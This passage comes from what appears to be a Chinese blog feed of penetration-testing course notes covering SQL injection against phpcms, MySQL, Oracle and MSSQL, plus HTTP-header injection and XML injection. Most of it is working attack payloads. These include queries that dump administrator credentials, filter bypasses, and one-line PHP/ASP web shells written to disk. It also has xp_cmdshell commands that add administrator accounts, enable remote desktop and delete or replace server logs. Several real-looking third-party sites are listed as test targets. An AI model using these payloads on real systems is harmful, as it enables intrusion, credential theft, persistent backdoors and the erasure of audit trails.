phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=getapplist&amp;auth_data=v=1&amp;appid=1&amp;data=662dCAZSAwgFUIUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwlXRlgeERUHQVl|UVJAAO|RXABSQEwNXAhZV|5V 然后本地构造注入页面进行注入 找到&quot;authkey&quot; 复制一段百度搜的那个的第二段代码 单独放在一个.php中,修改url和authkey 访问这个.php?id=1 放在sqlmap跑 Havij Pro(将破解文件放入之后,不用点注册就进去了)跑phpv9 HTTP头注入 常见的http请求中存在注入的参数 User-agent Referer X-Forwarded-For client_ip 发现方法: burp抓包添加污染参数 火狐插件: modify headers tamper data POST/uploads/comment.php?act=send HTTP/1.1 Host:127.0.0.1 User-Agent:Mozilla/5.0 (Windows NT 6.1;WOW64;rv:18.0)Gecko/20100101 Firefox/18.0 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language:zh-cn;zh;q=0.8;en-us;q=0.5,en;q=0.3 Accept-Encoding:gzip,defalte Cookie:PHPSESSID=caiu1hm6vu2mp9... Client_ip:1&apos; Connection:keep-alive Content-Type:application/x-www-form-url... Content-Length:63 mood=6&amp;comment=test&amp;id=1&amp;type=1&amp;submit=%CC%E1%BD%BB%C6%C0%C2%DB burp-&gt;repeater-&gt;raw-&gt;添加 X-Forwarded-For:1.1.1. Client-ip:1&apos; Mantra Modify插件加入进去 --左边第二个,搜索modify HTTP头注入 exp构造分析 INSERT INTO blue_comment(com_id,post_id,user_id,tyoe,mood,content,pub_date,ip,is_check) VALUES(&apos;&apos;,&apos;1&apos;,&apos;0&apos;,&apos;6&apos;,&apos;test&apos;,&apos;1480988752&apos;,&apos;111&apos;&apos;,&apos;1&apos;) 将111替换成-&gt; a&apos;,&apos;xxx&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;2&apos;,(select concat(admin_name,0x3a,pwd) from blue_admin limit 0,1),&apos;1645457407&apos;,&apos;sss&apos;,&apos;1&apos;)# XML实体注入 可扩展标记语言,标准通用标记语言的子集,是一种用于标记电子文件使其具有结构性的标记语言. 在电子计算机中,标记指计算机所能理解的信号符号,通过此种标记,计算机之间可以处理包含各种的信息比如文章等.它可以用来标记数据,定义数据类型,是一种允许用户对自己的标记语言来进行定义的源语言.它非常适合万维网传输,提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据.是Internet环境中跨平台的,依赖于内容的技术,也是当今处理分布式结构信息的有效工具.早在1998年,W3C就发布了XML1.0规范,使用它来简化Internet的文档信息传输. reg: &lt;?php &lt;USER role=user_role&gt;\n&lt;name&gt;&quot;.$username. &quot;&lt;/name&gt;\n&lt;pass&gt;&quot;.$password.&quot;&lt;/pass&gt;\n&lt;/USER&gt;&quot;; ?&gt; 在前台输入账户密码的密码时这样输入: amdin&lt;/pass&gt;&lt;/USER&gt;&lt;USER role=&quot;admin_role&quot;&gt;&lt;name&gt;cracer&lt;/name&gt;&lt;pass&gt;123456 (reg:正方)]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记14-oracleANDpostgreasql数据库注入]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B014-oracleANDpostgreasql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Oracle&amp;postgresql(国外用的多) 稳定,安全,可靠,,,但是贵 航空,物流,旅游,银行,大学,淘宝... Oracle注入详解: Oracle数据库系统是美国甲骨文提供的以分布式数据库为核心的一组软件产品,是目前世界上使用最为广泛的数据库管理系统.基于&quot;客户端/服务器&quot;模式结构,客户端应用程序与用户交互,接收用户信息,并向服务器发送请求,服务器系统负责管理数据信息和各种操作数据的活动. 特点: 1.支持多用户,大事务量的处理 2.数据安全性和完整性的有效控制 3.支持分布式数据处理 4.移植性强. 判断数据库: 判断注入: and 1=1 and 1=2 判断oracle数据库 and exists(select * from dual) and exists(select * from user_tables) 测试站点: http://www.e-hifarms.com/yellowpage/detail.jsp?id=111 http://www.hbhsteel.com/index/news/news_list_xq.jsp?info_no=2183513 Oracle经常搭(Tomcat)web服务器 判断列数: order by 11 返回正常 order by 12 返回错误 1.跟access差不多,联合查询 2.用户名和密码逐个ascii码猜解 order by 20 不报错,就说明有20以上的列 order by 30 报错,就说明小于30列 union select null,null,null...,null from dual 数字全部用null代替 union select 1,null,null...,null from dual 数字全部用null union select 1,1,null...,null from dual 数字全部用null 如果输入1,报错不出来,就说明有注入 union select &apos;null&apos;,null,null...,null from dual 数字全部用null 如果用&apos;&apos;,引起来之后不出现,则说明该列不是字符串列 获取基本信息: 获取数据库版本 (select banner from sys.v_$version where rownum=1) 获取操作系统版本 (select memeber from v$logfile whree rownum=1) 获取连接数据库的当前用户 (select SYS_CONTEXT(&apos;USERNV&apos;,&apos;CURRENT_USER&apos;)from dual) 获取数据库 (select owner from all_tables where rownum=1) 放在非数字类型列上 http://192.168.1.210:8080/Sqlinject/SqlTest.jsp?id=100 union select null,(select table_name from user_tables where rownum=1),null,....,null from dual http://192.168.1.210:8080/Sqlinject/SqlTest.jsp?id=100 union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&apos;第一张表名&apos;),null,....,null from dual 获取第一个列名 http://192.168.1.210:8080/Sqlinject/SqlTest.jsp?id=100 union select null,(select table_name from user_columns where table_name=&apos;admin&apos; and rownum=1),4,5,6 from dual,null,....,null from dual 第二列 &lt;&gt; 获取数据库 union select 1,2,name,4,5,6 from admin union select 1,2,pass,4,5,6 from admin 第二种注入方式 判断一下数据库中的表,网址后加上:and (select count(*) from admin)&lt;&gt;0返回正常,说明存在admin表.如果返回错误,可将admin改为username,manager等常用表名继续猜解. 指定表名获取列名 and (select count(name) from admin)&gt;=0返回正常,说明存在name字段 采用ASCII码折半法猜解管理员账号和密码 判断管理员名字长度 and (select count(*) from admin where length(name)&gt;=5)=1 说明:length()函数用于求字符串的长度,此处猜解用户名的长度和5比较,即猜测是否由5个字符组成. and (select count(*) from admin where ascii(substr(name,1,1))&gt;=97)=1 and (select count(*) from pwd where ascii(substr(name,1,1))&gt;=97)=1 postgresql注入详解: //14课,41:20]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记13-mysql]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B013-mysql%2F</url>
    <content type="text"><![CDATA[Mysql注入: MySQL是一个关系型数据库管理系统,由瑞典MySQL AB公司开发,目前属于Oracle旗下公司,MySQL最流行的关系型数据库管理系统,在WEB应用方面MYSQL是最好的RDBMS(关系数据库管理系统)应用软件之一.MySQL是一种关联数据库管理系统,关联数据库将数据保存在不同的表中,而不是将所有数据放在一个大仓库内,这样就增加了速度并提高了灵活性.MySQL所使用的SQL语言是用于访问数据库的最常用标准化语言.MySQL软件采用了双授权政策,它分为社区版和商业版,由于其体积小,速度快,总体拥有成本低,尤其是开放源码这一特点,一般中小型网站的开发都选择MySQL作为网站数据库.由于其社区版的性能卓越,搭配PHP和Apache可组成良好的开发环境. lamp平台(linux+apache+mysql+php脚本) php+mysql mysql安装 yum -y install httpd php mysql php-mysql mysql-server MySQL简单的操作命令: 1.说明:创建数据库 CREATE DATABASE database-name 2.说明:删除数据库 drop database dbname 3.说明:创建新表 CREATE TABLE MYTABLE (name VARCHAR(20),sex CHAR(1)); 4.查看数据库 show databases; //不清楚表名,用这个 union select 1,2,3,4 from information_schema.tables use information_schema; show tables; select * from tables; //创建表名 create database cracer; show databases; //创建表数据 use cracer create table user(name varchar(20),pass varchar(20)); show tables; //插入数据 insert into user(name,pass) values(&apos;admin&apos;,&apos;123456&apos;); select * from user Msql函数 1.system_user()系统用户名 2.user() 用户名 3.current_user 当前用户名 4.session_user() 连接数据库的用户名 5.database() 数据库名 6.version() MYSQL数据库版本 7.load_file() 转成16进制或者是10进制MYSQL读取本地文件的函数 8.@@datadir 读取数据库路径 9.@@basedir MYSQL安装路径 10.@@version_compile_os 操作系统 reg: select user(); select version(); select database(); Mysql数据库连接 &lt;?php $host=&apos;localhost&apos;;//数据库地址 $database=&apos;sui&apos;;//数据库名称 $user=&apos;root&apos;;//数据库账户 $pass=&apos;&apos;;//数据库密码 $pass=&apos;&apos;;//数据库密码 $webml=&apos;/0/&apos;;//安装文件夹 ?&gt; //root相当于sa权限 dede(织梦):存放数据库连接信息的文件:data/common.inc.php 数据库结构对比: access: A网站:adata.mdb 表名(admin) 列名(user,pass) 值 B网站:bdata.mdb 表名(admin) 列名(user,pass) 值 mysql A数据库名 B数据库名 表名 列名 值 Mysql注入原理 注入产生原理及防护绕过 注入形成原理 简单防注入实现 绕过防注入 $id=verify_null(verify_id($_GET[&apos;id&apos;]),&quot;参数&quot;); 这里是有处理的(经两个函数处理过) 简单的防注入实现(1) function check_sql($x){ $inject=array(&quot;select&quot;,&quot;union&quot;,&quot;from&quot;,&quot;and&quot;,&quot;or&quot;); $i=str_replace($inject,&quot;&quot;,$x); return %i; } /* function check_sql($Sql_Str){//自动过滤Sql的注入语句. $check=preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,$Sql_Str); if($check){ echo &apos;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;系统警告:\n\n请不要尝试在参数中包含非法字符尝试注入!&quot;);&lt;/script&gt;&apos;; exit(); }else{ return $Sql_Str; } } */ 简单的防注入实现(2) &lt;?php function inject_check($str){ $tmp=eregi(&apos;and|select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile&apos;,$str);//进行过滤 if($tmp){ echo &quot;输入非法注入内容!&quot;; exit(); }else{ return $str; } } $servername=&quot;localhost&quot;; $dbusername=&quot;root&quot;; $dbpassword=&quot;root&quot;; $dbnam&quot;jian&quot;; $id=$_GET(&apos;id&apos;); $id=inject_check($id); ... &gt; $id=$_GET(&apos;id&apos;); select * from admin where id=$id; &lt;?php $servername=&quot;localhost&quot;; $dbusername=&quot;root&quot;; $dbpassword=&quot;root&quot;; $dbnam&quot;jian&quot;; $id=$_GET(&apos;id&apos;); $cksql=array(&quot;and&quot;,&quot;union&quot;,&quot;select&quot;,&quot;from&quot;,&quot;order by&quot;); $id=str_replace($cksql,&quot;&quot;,$id); $conn=mysql_connect($servername,$dbusername,$dbpassword) or die (&quot;数据库连接失败&quot;); mysql_select_db($dbname,$conn); $sql=&quot;SELECT * FROM yzsoumember WHERE id=$id&quot;; $result=mysql_db_query($dbname,$sql,$conn); echo $sql; /php&gt; 当and 1=1里面的and替换成空时, 绕过方式: 防注(1)大小写And,aandnd 1=1 防注(2)%00编码绕过%20a%00nd%201=1,%20a%01nd%201=1 (%0aand%0a1=1) 判断注入: and 1=1 返回正常 and 1=2 返回不正常 存在注入点 注入:?id=13 order by 10 返回正常则说明有10列 -&gt;UNION查询-&gt;让它报错 and 1=2 或者 id=-13 //找的是非数字列 -&gt;2改成version(),user(),database()-&gt;最后一个爆数据库表 -&gt; group_concat(table_name),3,4,5...8,9,10 from information_schema.tables where table_schema=十六进制表名 -&gt;漏洞利用-&gt;小葵转16进制(Hex) -&gt;group_concat(column_name),3,4,5...8,9,10 from information_schema.tables where column_name=十六进制列名 -&gt;group_concat(m_name,0x7e,m_pwd),3,4,5...8,9,10 from manage_user //爆数据,加0x7e(~)来区分两变量 Mysql 4.0 渗透 利用sqlmap注入读取文件 查询表名称 进行查询 sqlmap --sql-shell select load_file(&apos;/usr/www/inde.php&apos;); Mysql显错注入 判断是否存在注入输入&apos; reg:输入admin&apos;,出现You have an error in your SQL syntax; 爆当前数据库用户 -99999999999&apos; union select 1 from (select count(*),contcat(floor(rand(0)*2),(select user() limit 0,1))a from information_schema.tables group by a)b# 爆当前数据库名称 -99999999999&apos; union select 1 from (select count(*),contcat(floor(rand(0)*2),(select database() limit 0,1))a from information_schema.tables group by a)b# 爆当前版本号 -99999999999&apos; union select 1 from (select count(*),contcat(floor(rand(0)*2),(select version() limit 0,1))a from information_schema.tables group by a)b# (上方代码直接带入用户名里面进行登陆查询) (#代表 直接注释掉后面的代码) 0x+暴露数据库/表名(因为爆出来的是16进制,需要将16进制还原回10进制) 爆第二个表:(把limit 0-&gt;1) &apos;and(select 1 from (select count(*),concat((select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x64656E67 and table_name=0x75736572 limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)# 爆内容 &apos;and(select 1 from (select count(*),concat((select (select distinct concat(0x7e,0x27,user.username,0x27,0x7e) from user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)# &apos;and(select 1 from (select count(*),concat((select (select distinct concat(0x7e,0x27,user.password,0x27,0x7e) from user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)# And sleep(5) + And Extractvalue(1,Concat(0x7e,(selecT @@version),0x7e)) %0a,and 1=1,大写...像这样的可以在中间加A%00nd,%01,关键字用%00拆开就好 先用(admin&apos;测试,如果有注入,就可以这样绕过) 后台绕过 select * from user where username=&quot;and passowrd=&apos;&apos; 输入: admin&apos;# select * from user where username=&apos;admin&apos;#&apos; and password=&apos;&apos; 输入: admin&apos;or&apos;1=1 select * from user where username=&apos;admin&apos; or &apos;1=1&apos; and passowrd=&apos;&apos; admin&apos;# --登录成功 admin&apos; or &apos;1&apos;=&apos;1 --登录成功 Mysql读写函数的使用 load_file()函数 该函数是用来读取源文件的函数 只能读取绝对路径的网页文件 在使用load_file()时应先找到网站绝对路径 例如: d:/www/xx/index.php /usr/src/apache/htdoc/index.php 注意: 1.路径符合&quot;\&quot;错误&quot;\\&quot;正确&quot;/&quot;正确 2.转换十六进制数,就不要&apos;&apos; 获取网站根路径 1.报错显示 2.谷歌黑客 site:目标网站warning 3.遗留文件phpinfo info test php 4.漏洞爆路径 5.读取配置文件 读取网站文件内容 and 1=2 union select 1,load_file(&apos;C:\\Inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php&apos;),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 and 1=2 union select 1,load_file(0x443A5C7068705C41504D53657276352E322E365C7777775C6874646F63735C335C636F6E6669672E706870),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 (或者将路径加上引号一起转成十六进制,转之前用一个\就行了) and 1=2 union select 1,load_file(&apos;C:\\Inetpub\\wwwroot\\mysql-sql\\inc\\xyconn.php&apos;),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 c:/windows/system32/inetsrv/metabase.xml//配置网站信息的 /etc/passwd /var/log/message /etc/httpd/conf/log/access_log 上传报错爆破比较简单 写入函数into outfile (即导入一句话脚本木马) and 1=2 union select 1,&quot;&lt;?php @eval($_POST[&apos;cracer&apos;]);?&gt;&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile &apos;C:/Inetpub/wwwroot/mysql-sql/cracer.txt&apos; 利用注入漏洞执行系统命令: 第一种方法:需要使用wamp环境搭建需要系统权限才能执行 and 1=2 union select 1,&quot;net user seven 123 /add&quot;,2,3,4,5,6 into outfile &apos;C://Documents and Settings/Administrator/ [开始]菜单/程序/启动/1.bat&apos; 第二种方法: and 1=2 union select 1,&quot;&lt;pre&gt;&lt;body&gt;&lt;?@system($_GET[&apos;cc&apos;]);?&gt;&lt;/body&gt;&lt;/pre&gt;&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile &apos;C:/Inetpub/wwwroot/mysql-sql/cr.php&apos; 魔术引号与宽字节注入: 本特性已自5.3.0起废弃并将自PHP5.4.0起移除. 当打开时,所有的&apos;(单引号),&quot;(双引号),\(反斜线)和NULL字符都会被自动加上一个反斜线进行转义,这和addslashes()作用完全相同 一共有三个魔术引号指令 magic_quotes_gpc影响到HTTP请求数据(GET,POST和COOKIE) 不能在运行时改变,在PHP中默认值为on.参加get_magic_quotes_gpc(). magic_quotes_runtime如果打开的话,大部分从外部来源取得数据并返回的函数 包括从数据库和文本文件,所返回的数据都会被反斜线转义 该选项可在运行时改变,在PHP中的默认值为off 参见set_magic_quotes_runtime()和get_magic_quotes_runtime() magic_quotes_sybase如果打开的话,将会使用单引号进行转义而非反斜线 此选项会完全覆盖magic_quotes_gpc 如果同时打开两个选项的话,单引号将会被转义成&quot;.而双引号,反斜线和NULL字符将不会进行转义 如何取得其值参见ini_get() 当magic_quotes_gpc开启时,&apos;会过滤成\&apos; 关于魔术引号注入 使用宽字节注入绕过魔术引号 %df%27 sqlmap.py -u &quot;cracer.com/xx.php?id=1&quot; --risk 3 --dbms=mysql -p username --tamper unmagicquotes.py -v 3 宽字节相当于%bf%27 注入工具: 萝卜头,穿山甲,sqlmap等 Pangolin sqlmap.py -u &quot;http://....&quot; --dbs --current-user --os-shell php 2 手动输入数据库路径 --current -db -tables -D xy -D -T manager_user --columns -D -T manager_user -C m_name,m_pwd --dump --sql -shell select load_file(&quot;路径&quot;); select load_file(&quot;路径/wwwroot/sysqlql-sql/xyconn.php&quot;);]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记12-sqlserver注入]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B012-sqlserver%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Mssql数据库调用分析 Mssql注入原理 Mssql注入另类玩法 Mssql介绍: 美国Microsoft公司推出的一种关系型数据库系统.SQLServer是一个可扩展的,高性能的,为分布式客户机/服务器计算所设计的数据库管理系统,实现了与WindowsNT的有机结合,提供了基于事务的企业级信息管理系统方案. 其主要特点如下: (1)高性能设计,可充分利用WindowsNT的优势 (2)系统管理先进,支持Windows图形化管理工具,支持本地和远程的系统管理和配置. (3)强壮的事务处理功能,采用各种方法保证数据的完整性 (4)支持对称多处理结构,存储过程,ODBC,并具有自主的SQL语言.SQLServer以其内置的数据复制功能,强大的管理工具,与Internet的紧密集成和开放的系统结构为广大的用户,开发人员和系统集成商提供了一个出众的数据库平台. 学校考试网站一般都是数据库为SQLServer,Oracle MSsql服务,端口,后缀 重启服务,使其生效 命令:services.msc TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 1433端口是开启的.当我们关闭服务后,端口也将关闭 后缀: cracer.mdf 日志文件后缀 cracer_log.ldf ***********sopanpan(搜盘盘) www.sopanpan.com********** 创建表的同时,会创建日志 列 数据类型 允许空 id nchar username nvarchar password nvarchar 如何删除: 右击-&gt;任务-&gt;分离-&gt;删除连接,更新..,保留.. 要先分离,才能脱裤(即复制库)(一个库,一个日志库) 数据库-&gt;右击-&gt;附加数据库,就添加了数据库 右击-&gt;任务-&gt;备份,但是备份的是.bak文件 右击-&gt;任务-&gt;生成脚本-&gt;选中数据库下一步-&gt;为服务器编写脚本,08到05使用时这个一定要选SQL Server 2005-&gt;下一步-&gt;选择对象,选中用户,表-&gt;下一步,勾选-&gt;下一步-&gt;勾选-&gt;下一步-&gt;将脚本保存到文件-&gt;下一步-&gt;完成. 使用方法:如果有已存在的表就先分离,然后再新建查询-&gt;将sql语句复制进去. 新建角色,以及获得权限 use cracer//使用哪个数据库 select * from admin insert into admin (id,username,password) values (4,&apos;dd&apos;,&apos;admin&apos;) 作业: 1.安装SQLServer数据库 2.操作数据库,背下常用的sql语句 mssql数据库权限: sa权限:数据库操作,文件管理,命令执行,注册表读取等. system db权限:文件管理,数据库操作等users-adminstrators public权限:数据库操作guest-users 调用数据库代码 &lt;% set conn=server.createobject(&quot;adodb.connection&quot;) conn.open &quot;provider=sqloledb;source=local;uid=sa;pwd=******;database=database-name&quot; %&gt; 其中,provider后面的不用管,照写;source后面的可以是ip地址,这里我用的是本地的;sa是内置的用户,它的密码是在你安装的时候设置的;database后面是你要连接的数据库的名称.reg:mydatabase(不需扩展名). inc/conn.asp inc/config.asp config.asp web.config---这里一般存连接信息 注入语句: 1.判断是否有注入 and 1=1 and 1=2 / -0 判断注入的方法是一样的 2.初步判断是否是mssql and user&gt;0 3.判断数据库系统 and (select count(*) from sysobjects)&gt;0 mssql and (select count(*) from msysobjects)&gt;0 access 4.注入参数是字符 &apos;and[查询条件]and&apos;&apos;=&apos; 5.搜索时没过滤参数的 &apos;and [查询条件] and &apos;%25&apos;&apos;=&apos; 6.猜数表名 and (select Count(*) from [表名] )&gt;0 7.猜字段 and (select Count(字段名) from 表名)&gt;0 8.猜字段中记录长度 and (select top 1 len(字段名) from 表名)&gt;0 9.(1)猜字段的 ascii值(access) and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0 (2)猜字段的ascii值(mssql) and (select top 1 unicode(substring(字段名,1,1)) from 表名)&gt;0 10.测试权限结构(mssql) and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;));-- and 1=(select IS_SRVROLEMEMBER(&apos;serveradmin&apos;));-- and 1=(select IS_SRVROLEMEMBER(&apos;setupadmin&apos;));-- and 1=(select IS_SRVROLEMEMBER(&apos;securityadmin&apos;));-- and 1=(select IS_SRVROLEMEMBER(&apos;diskadmin&apos;));-- and 1=(select IS_SRVROLEMEMBER(&apos;bulkadmin&apos;));-- and 1=(select IS_MEMBER(&apos;db_owner&apos;));-- 11.添加mssql和系统的账户 exec master.dbo.sp_addlogin username;-- exec master.dbo.sp_password null,username,password;-- exec master.dbo.sp_addsrvrolemember sysadmin,username;-- exec master.dbo.xp_cmdshell &apos;net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&apos;;-- exec master.dbo.xp_cmdshell &apos;net user username password /add&apos;;-- exec master.dbo.xp_cmdshell &apos;net localgroup administrators username /add;-- 判断注入: http://testasp.vulnweb.com/showforum.asp?id=0 在加入&apos;后 报错 id=@@version 或者是 and 1=(select @@version) 获取当前数据库名称 //当前使用的数据库 id=1 and 1=(select db_name()) 获取用户数据库名称 //获取第一个用户数据库 and 1=(select top 1 name from master...sysdatabases where dbid&gt;4) and 1=(select top 1 name from master...sysdatabases where dbid&gt;5) and 1=(select top 1 name from master...sysdatabases where dbid&gt;6) //获取下一个用户数据库 and 1=(select top 1 name from master...sysdatabases where dbid&gt;4 and name&lt;&gt; &apos;acublog&apos;) //以此类推,可以获取全部用户数据库名 and 1=(select top 1 name from master...sysdatabases where dbid&gt;4 and name&lt;&gt; &apos;acublog&apos; and name&lt;&gt; &apos;2014&apos;) ***数据库全部爆出来 and 1=(select name from master...sysdatabases where for xml path) 获取表名 //获取第一张表threads ?id=1 and 1=(select top 1 name from sysobjects where xtype=&apos;u&apos;) ?id=1 and 1=(select top 1 name from sysobjects where xtype=&apos;u&apos; and name &lt;&gt;&apos;admin&apos;) ?id=1 and 1=(select name from sysobjects for xml path) 获取表users的列名 //获取第一列列名uname ?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&apos;admin&apos;)) //获取第二列列名 ?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&apos;admin&apos;) and name&lt;&gt; &apos;id&apos;) 获取表users数据 //获取第一个用户名 ?id=1 and 1=(select top 1 password from admin) 如果查到是空白,不是报错,说明不是该类型 过滤机制: 防注代码 ,可以用大小写转换过防注入 用%0a来代替空格 +来代替空格 测试站点: http://testasp.vulnweb.com/showforum.asp?id=0 http://www.langesteel.com/onew11.asp?id=42574 Mssql数据库另类玩法: mssql注入时用户权限分析 sa权限,dbo,public 基本信息搜集 注入点权限判断: and 1=(select is_srvrolemember(&apos;sysadmin&apos;))//判断是否有系统管理员 and 1=(select is_srvrolemember(&apos;db_owner&apos;))//判断是否有库权限 and 1=(select is_srvrolemember(&apos;public&apos;))//判断是否为public权限 and 1=convert(int,db_name())或1=(select db_name())//当前数据库名 and 1=(select @@servername)//本地服务名 and 1=(select HAS_DBACCESS(&apos;master&apos;))//判断是否有库读取权限 ****利用MsSQL扩展存储注入攻击 1.检测与恢复扩展存储 判断xp_cmdshell扩展存储是否存在 and 1=(select count(*) from master.dbo.sysobjects where xtype=&apos;x&apos; AND name=&apos;xp_cmdshell&apos;) 判断xp_regread扩展存储过程是否存在 and 1=(select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;) 恢复 EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE; ;exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; sa权限下扩展存储攻击利用方法: 1.利用xp_cmdshell扩展执行任意命令 查看C盘 ;drop table black ;create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))- ;insert into black exec master..xp_cmdshell &apos;dir c:\&apos; and 1(select top 1 mulu from black where id=1) 新建用户 ;exec master..xp_cmdshell &apos;net user test test /add&apos; 这里如果报错的话:工具包-&gt;数据管理-&gt;sa开启...-&gt;第一段代码复制注入 ;exec master..xp_cmdshell &apos;net localgroup administrators test /add&apos; cmd-&gt;mstsc(远程) sa权限下扩展存储攻击利用方法: 添加和删除一个SA权限的用户test:(需要SA权限) exec master.dbo.sp_addlogin test,password exec master.dbo.sp_addsrvrolemember test,sysadmin 停掉或激活某个服务.(需要SA权限) exec master..xp_servicecontrol &apos;stop&apos;,&apos;schedule&apos; exec master..xp_servicecontrol &apos;start&apos;,&apos;schedule&apos; 暴网站目录 create table labeng(lala nvarchar(255),id int) DECLARE @result varchar(255) EXEC master.dbo.xp_regread &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots&apos;,&apos;/&apos;,@result output insert into labeng(lala) values(@result); and 1=(select top 1 lala from labeng)或者and 1=(select count(*) from labeng where lala&gt;1) 删除日志记录: ;exec master.dbo.xp_cmdshell &apos;del c:\winnt\system32\logfiles\w3svc5\ex070606.log&gt;c:\temp.txt&apos; 替换日志记录: ;exec master.dbo.xp_cmdshell &apos;copy c:\winnt\system32\logfiles\w3svc5\ex070404.log c:\winnt\system32\logfiles\w3svc5\ex070606.log&gt;c:\temp.txt&apos; 开启远程数据库1: ;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;server=servername;uid=sa;pwd=apachy_123&apos;,&apos;select * from table1&apos;) 开启远程数据库2: ;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;&apos;,&apos;select * from table&apos;) 打开3389 ;exec master..xp_cmdshell &apos;sc config termservice start=auto&apos; ;exec master..xp_cmdshell &apos;net start ter mservice&apos; ;exec master..xp_cmdshell &apos;reg add&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x0 /f&apos; //允许外部连接 ;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f&apos; //改端口到80 利用sp_makewebtask写入一句话木马 ;exec sp_makewebtask &apos;c:\inetpub\wwwroot\x.asp&apos;,&apos;select&quot;%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E&quot;&apos;-- http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27-- 修改管理员密码 update admin set password=123123 where username=&apos;admin&apos;; dbowner权限下的扩展攻击利用 1.判断数据库用户权限 and 1=(select is_member(&apos;db_owner&apos;));-- 2.搜索web目录 ;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));- 然后 ;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &apos;c:&apos;,1,1- and(select dir from temp where id=1)&gt;0 由于不能一次性获取所有目录文件和文件夹名,因此需要更改ID的值,依次列出文件和文件夹. 写入一句话木马 找到web目录后,就可以写入一句话木马了 ;alter database ssdown5 set RECOVERY FULL ;create table test(str image)-- ;backup log ssdown5 to disk=&apos;c:\test&apos; with init-- ;insert into test(str) values(&apos;&lt;%excute(request(&quot;cmd&quot;))%&gt;&apos;)-- ;backup log ssdown5 to disk=&apos;c:\inetpub\wwwroot\x.asp&apos;-- ;alter database ssdown5 set RECOVERY simple 测试站点 http://www.langesteel.com/onew11.asp?id=42574 工具: 穿山甲,萝卜头,sqlmap等 漏洞利用-&gt;pangolin 漏洞利用-&gt;GetWebShell sqlmap-&gt; 注入点: GET 